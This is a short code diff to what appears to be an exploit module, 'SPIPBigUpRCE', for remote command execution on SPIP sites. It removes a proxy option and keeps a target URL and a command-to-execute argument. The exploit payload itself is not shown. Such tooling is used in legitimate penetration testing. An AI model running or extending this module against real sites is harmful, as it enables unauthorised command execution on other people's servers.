@@ -24,11 +24,10 @@ class SPIPBigUpRCE(Module):
 
     module_args = [
         Argument("url", desc="Target URL (e.g., http://example.org)"),
-        Argument("proxy", "-p", "--proxy", desc="Proxy (e.g., http://127.0.0.1:8080)", default=None),
         Argument("cmd", "-c", "--cmd", desc="Command to execute", default="id")
     ]
 
-    async def execute(self, url: str, proxy: str, cmd: str):
+    async def execute(self, url: str, cmd: str):
         if not url.startswith(('http://', 'https://')):
             url = 'http://' + url
 
@@ -38,7 +37,7 @@ class SPIPBigUpRCE(Module):
         full_url = urljoin(url, endpoint)
 
         try:
-            get_resp = await self.env.get(full_url, proxy=proxy)
+            get_resp = await self.env.get(full_url)
             if not get_resp or get_resp.status != 200:
                 self.log_failure("[-] Failed to fetch initial page")
                 return {'bigup_rce': None}
